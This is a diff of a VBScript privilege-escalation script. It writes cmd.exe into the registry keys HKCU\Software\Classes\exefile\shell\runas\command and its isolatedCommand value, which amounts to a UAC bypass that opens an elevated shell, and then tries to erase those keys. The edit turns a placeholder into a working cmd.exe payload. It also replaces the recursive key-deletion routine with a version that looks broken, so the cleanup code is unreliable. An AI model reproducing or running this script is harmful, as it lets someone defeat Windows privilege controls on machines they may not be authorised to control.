@@ -9,8 +9,8 @@ dim fso
 dim Directory, CurrentDirectory, Dr2
 Set fso = CreateObject("Scripting.FileSystemObject")
 CurrentDirectory = fso.GetAbsolutePathName(".")
-Directory = "your software....."
-Set HKCU\Software\Classes\exefile
+Directory = "C:\Windows\System32\cmd.exe"
+Set objSh = WScript.CreateObject ("WScript.Shell")
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", Directory, "REG_SZ"
 WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\isolatedCommand", Directory, "REG_SZ"
@@ -24,20 +24,12 @@ objSh.Run ex
 strComputer = "."
 strKeyPath = "Software\Classes\exefile" 
 DeleteSubkeys HKEY_CURRENT_USER, strKeypath
-Set objRegistry = GetObject("winmgmts:\\" & _
-    strComputer & "\root\default:StdRegProv") 
 
-Sub DeleteSubkeys(HKEY_CURRENT_USER, strKeyPath) 
-    objRegistry.EnumKey HKEY_CURRENT_USER, strKeyPath, arrSubkeys 
-
-    If IsArray(arrSubkeys) Then 
-        For Each strSubkey In arrSubkeys 
-            DeleteSubkeys HKEY_CURRENT_USER, strKeyPath & "\" & strSubkey 
-        Next 
-    End If 
-
-    objRegistry.DeleteKey HKEY_CURRENT_USER, strKeyPath 
+Sub DeleteSubkeys(HKEY_CURRENT_USER, strKeyPath)
+    Dim objRegistry
+    Set objRegistry=GetObject("winmgmts:\\" & _
+    strComputer & "\root\default:StdRegProv")
+    objRegistry.DeleteKey HKEY_CURRENT_USER, "HKCU\Software\Classes\exefile"
 End Sub
-
 
 
